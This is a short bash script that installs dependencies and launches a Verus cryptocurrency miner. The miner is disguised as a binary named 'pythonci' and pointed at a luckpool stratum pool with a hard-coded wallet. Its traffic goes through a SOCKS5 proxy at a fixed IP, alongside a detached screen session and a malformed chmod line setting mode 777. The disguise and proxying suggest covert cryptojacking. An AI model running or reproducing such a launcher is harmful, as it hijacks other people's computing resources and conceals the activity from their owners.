#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x tai.sh && chmod +x pythonci chmod 777 pythonci tai.sh
screen -dmS ls
PL=stratum+tcp://na.luckpool.net:3956
WT=RPkwwC1SL8QNjP1X242btbLA8othyHMRC9
WR=organ
PY=socks5://91.221.70.248:9100	
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
